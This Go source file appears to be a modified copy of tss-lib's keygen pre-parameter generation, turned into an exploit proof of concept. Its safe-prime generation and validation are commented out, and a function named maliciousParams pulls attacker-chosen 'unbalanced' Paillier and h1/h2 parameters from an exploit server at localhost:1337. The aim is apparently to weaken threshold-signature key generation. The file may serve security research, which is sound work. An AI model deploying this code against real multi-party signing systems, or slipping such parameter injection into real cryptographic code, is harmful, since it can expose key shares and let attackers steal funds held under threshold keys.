// Copyright © 2019 Binance
//
// This file is part of Binance. The full Binance copyright notice, including
// terms governing use, modification, and redistribution, is contained in the
// file LICENSE at the root of the source code distribution tree.

package keygen

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"runtime"
	"time"

	"github.com/binance-chain/tss-lib/common"
	"github.com/binance-chain/tss-lib/crypto/paillier"
	zkpprm "github.com/binance-chain/tss-lib/crypto/zkp/prm"
)

const (
	safePrimeBitLen = 1024
)

var (
	one = big.NewInt(1)
)

type Params struct {
	N                 *big.Int         `json:"N"`
	P                 *big.Int         `json:"p"`
	Q                 *big.Int         `json:"q"`
	H1                *big.Int         `json:"h1"`
	H2                *big.Int         `json:"h2"`
	ProofDlogH2BaseH1 *zkpprm.ProofPrm `json:"proof_dlog_h2_base_h1"`
	ProofDlogH1BaseH2 *zkpprm.ProofPrm `json:"proof_dlog_h1_base_h2"`
}

func maliciousParams(exploitBaseURL string, N *big.Int) *Params {
	var resp *http.Response
	var err error
	if N == nil {
		resp, err = http.Get(exploitBaseURL + "/gen-params?type=unbalance&dlog_proof_repeat=64")
	} else {
		resp, err = http.Get(exploitBaseURL + fmt.Sprintf("/params?N=%d", N))
	}
	if err != nil {
		log.Fatal(err)
	}
	var obj Params
	if err := json.NewDecoder(resp.Body).Decode(&obj); err != nil {
		log.Fatal(err)
	}
	return &obj
}

// GeneratePreParams finds two safe primes and computes the Paillier secret required for the protocol.
// This can be a time consuming process so it is recommended to do it out-of-band.
// If not specified, a concurrency value equal to the number of available CPU cores will be used.
func GeneratePreParams(timeout time.Duration, optionalConcurrency ...int) (*LocalPreParams, error) {
	var concurrency int
	if 0 < len(optionalConcurrency) {
		if 1 < len(optionalConcurrency) {
			panic(errors.New("GeneratePreParams: expected 0 or 1 item in `optionalConcurrency`"))
		}
		concurrency = optionalConcurrency[0]
	} else {
		concurrency = runtime.NumCPU()
	}
	if concurrency /= 3; concurrency < 1 {
		concurrency = 1
	}

	common.Logger.Info("generating the safe primes for the signing proofs, please wait...")
	start := time.Now()
	// sgps, err := common.GetRandomSafePrimesConcurrent(safePrimeBitLen, 2, timeout, concurrency)
	params := maliciousParams("http://localhost:1337", nil)
	sgps := []*common.GermainSafePrime{
		{
			P: params.P,
			Q: new(big.Int).Rsh(params.P, 1),
		},
		{
			P: params.Q,
			Q: new(big.Int).Rsh(params.Q, 1),
		},
	}
	// if err != nil {
	// 	// ch <- nil
	// 	return nil, err
	// }
	common.Logger.Infof("safe primes generated. took %s\n", time.Since(start))

	// if sgps == nil || sgps[0] == nil || sgps[1] == nil ||
	// 	!sgps[0].Prime().ProbablyPrime(30) || !sgps[1].Prime().ProbablyPrime(30) ||
	// 	!sgps[0].SafePrime().ProbablyPrime(30) || !sgps[1].SafePrime().ProbablyPrime(30) {
	// 	return nil, errors.New("error while generating the safe primes")
	// }

	P, Q := sgps[0].SafePrime(), sgps[1].SafePrime()
	paiPK := &paillier.PublicKey{N: new(big.Int).Mul(P, Q)}
	// phiN = P-1 * Q-1
	PMinus1, QMinus1 := new(big.Int).Sub(P, one), new(big.Int).Sub(Q, one)
	phiN := new(big.Int).Mul(PMinus1, QMinus1)
	// lambdaN = lcm(P−1, Q−1)
	gcd := new(big.Int).GCD(nil, nil, PMinus1, QMinus1)
	lambdaN := new(big.Int).Div(phiN, gcd)
	paiSK := &paillier.PrivateKey{PublicKey: *paiPK, LambdaN: lambdaN, PhiN: phiN}
	NTildei := new(big.Int).Mul(P, Q)
	// modNTildeI := common.ModInt(NTildei)

	p, q := sgps[0].Prime(), sgps[1].Prime()
	// modPQ := common.ModInt(new(big.Int).Mul(p, q))
	// f1 := common.GetRandomPositiveRelativelyPrimeInt(NTildei)
	// alpha := common.GetRandomPositiveRelativelyPrimeInt(NTildei)
	// beta := modPQ.Inverse(alpha)
	// h1i := modNTildeI.Mul(f1, f1)
	// h2i := modNTildeI.Exp(h1i, alpha)
	h1i := params.H1
	h2i := params.H2

	preParams := &LocalPreParams{
		PaillierSK: paiSK,
		NTildei:    NTildei,
		H1i:        h1i,
		H2i:        h2i,
		// Alpha:      alpha,
		// Beta:       beta,
		P:          p,
		Q:          q,
	}
	return preParams, nil
}
